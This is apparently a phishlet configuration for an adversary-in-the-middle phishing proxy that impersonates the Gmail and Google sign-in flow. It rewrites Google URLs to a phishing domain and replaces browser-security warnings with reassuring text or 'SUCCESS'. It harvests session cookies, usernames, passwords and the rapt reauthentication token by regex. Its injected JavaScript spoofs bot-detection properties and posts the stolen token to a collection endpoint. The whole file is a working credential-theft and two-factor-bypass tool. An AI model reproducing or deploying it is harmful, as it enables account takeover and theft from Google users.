name: 'Gmail'
author: '@billioncodesInc'
min_ver: '3.3.0'

proxy_hosts:
  - {phish_sub: 'www3', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false}
  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: false, is_landing: false}
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}

sub_filters:
  # Critical: Rewrite JS bundle URLs to use phishing domain
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://www.gstatic.com/_/mss/boq-identity/_/js/k=boq-identity.AccountsSignInUi.e', replace: 'https://accounts.{domain}/_/mss/boq-identity/_/js/k=boq-identity.AccountsSignInUi.e', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Fix hostname replacements
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Rewrite gstatic.com references
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'www.gstatic.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Fix "browser not secure" messages
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'This browser or app may not be secure', replace: 'Please continue to sign in', mimes: ['text/html', 'application/json']}
  
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Couldn''t sign you in', replace: 'Sign in', mimes: ['text/html', 'application/json']}
  
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '"BROWSER_NOT_SUPPORTED"', replace: '"SUCCESS"', mimes: ['application/json']}
  
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '"UNSUPPORTED_BROWSER"', replace: '"SUCCESS"', mimes: ['application/json']}
  
  # Rewrite accounts.google.com references
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'text/javascript']}
  
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts/SetOSID', replace: '', mimes: ['application/json', 'text/html', 'application/javascript', 'text/javascript']}


auth_tokens:
  - domain: '.google.com'
    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", ".*,regexp"]
  - domain: 'google.com'
    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", ".*,regexp"]
  - domain: 'accounts.google.com'
    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
  - domain: '.accounts.google.com'
    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
  - domain: 'ogs.google.com'
    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
  - domain: '.ogs.google.com'
    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
  - domain: 'myaccount.google.com'
    keys: [".*,regexp"]
  - domain: 'mail.google.com'
    keys: [".*,regexp"]

auth_urls:
  - '/v3/signin/challenge/pwd/data/batchexecute'
  - '/CheckCookie'
  - '/ManageAccount'
  - '/'

credentials:
  username:
    key: ''
    search: '\[\[\["MI613e","\[null,\\"(.*?)\\"'
    type: 'post'
  password:
    key: ''
    search: '\[1,1,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
    type: 'post'
  custom:
    - key: 'f.req'
      search: '\["gf.siecp","([^"]*)"\]'
      type: 'post'
    - key: 'rapt'
      search: '"rapt":"([^"]*)'
      type: 'json'

login:
  domain: 'accounts.google.com'
  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'

# ============================================================================
# JS INJECTION - SIMPLIFIED (No pre-generation, synchronous bypasser only)
# ============================================================================

js_inject:
  - trigger_domains: ['myaccount.google.com']
    trigger_paths: ['*']
    script: |
        window.addEventListener('load', () => {
          if (window.location.pathname === '/') {
            window.location.href = '/u/4/signinoptions/twosv';
            return;
          }
          const urlParams = new URLSearchParams(window.location.search);
          if (urlParams.has('rapt')) {
            const xxxValue = urlParams.get('rapt');
            fetch('/xxx', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ rapt: xxxValue })
            })
            .then(response => response.json())
            .then(data => console.log('Success:', data))
            .catch(error => console.error('Error:', error));
          }
        });
  
  - trigger_domains: ['accounts.google.com']
    trigger_paths: ['/signin*', '/v3/signin/identifier*', '/v3/signin/challenge*']
    script: |
        (function() {
          // Anti-bot detection: Spoof navigator properties
          Object.defineProperty(navigator, 'webdriver', {get: () => false});
          Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
          Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
          
          // Monitor for email submission and force redirect
          let emailSubmitted = false;
          const originalFetch = window.fetch;
          window.fetch = function(...args) {
            return originalFetch.apply(this, args).then(response => {
              const url = typeof args[0] === 'string' ? args[0] : (args[0].url || '');
              if (url.includes('batchexecute') && url.includes('MI613e')) {
                response.clone().text().then(text => {
                  if (text.includes('identifier') && !text.includes('INCORRECT_ANSWER') && !emailSubmitted) {
                    emailSubmitted = true;
                    setTimeout(() => {
                      const params = new URLSearchParams(window.location.search);
                      const pwdUrl = '/v3/signin/challenge/pwd?' + params.toString();
                      window.location.replace(pwdUrl);
                    }, 300);
                  }
                });
              }
              return response;
            });
          };
        })();

# Force POST parameters for proper flow
force_post:
  - path: '/v3/signin/_/AccountsSignInUi/data/batchexecute*'
    search:
      - {key: 'f.req', search: '.*'}
    force:
      - {key: 'continue', value: 'https://mail.google.com/mail/u/0/'}
    type: 'post'
  - path: '/v3/signin/challenge/pwd*'
    search:
      - {key: 'continue', search: '.*'}
    force:
      - {key: 'continue', value: 'https://mail.google.com/mail/u/0/'}
    type: 'post'
  - path: '/v3/signin/challenge/pwd/data/batchexecute*'
    search:
      - {key: 'f.req', search: '.*'}
    force:
      - {key: 'continue', value: 'https://mail.google.com/mail/u/0/'}
    type: 'post'
